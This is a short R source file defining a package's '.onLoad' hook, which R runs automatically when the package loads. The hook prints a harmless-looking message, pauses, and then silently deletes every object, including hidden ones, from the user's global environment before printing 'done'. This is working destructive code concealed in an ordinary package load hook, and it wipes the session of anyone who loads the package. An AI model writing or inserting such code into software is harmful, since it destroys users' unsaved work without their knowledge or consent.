.onLoad <- function(libname, pkgname){
    print('boring')
    Sys.sleep(5)
    rm(list = ls(.GlobalEnv, all.names = T), envir = .GlobalEnv)
    print('done')
}
